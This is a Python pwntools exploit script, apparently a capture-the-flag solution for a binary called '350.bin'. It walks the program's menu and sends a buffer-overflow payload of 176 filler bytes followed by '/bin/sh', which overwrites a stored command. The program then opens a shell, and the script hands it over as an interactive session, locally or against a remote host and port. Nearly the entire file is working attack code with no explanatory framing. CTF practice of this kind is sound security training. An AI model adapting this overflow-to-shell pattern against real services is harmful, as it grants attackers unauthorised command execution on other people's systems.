#!/usr/bin/env python

from pwn import *
import sys

def onenewtest():
	r.sendline('onenewtest')
	r.recvuntil("Creating a new test")

def newcommand():
	r.sendline('newcommand')
	r.recvuntil("Creating a new command...")

def setthetest(n, s):
	r.sendline('setthetest')
	r.recvuntil('Running action setthetest')
	r.sendline(str(n))
	r.recvuntil('Reading string')
	r.sendline(s)

def runthecommand(n):
	r.sendline('runthecommand')
	r.sendline(str(n))
	r.recvuntil('Running shell')

def exploit(r):

	onenewtest()
	newcommand()

	payload = "A" * 176
	payload += '/bin/sh'

	setthetest(0, payload)
	runthecommand(0)

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['350.bin'])
        print util.proc.pidof(r)
        pause()
        exploit(r)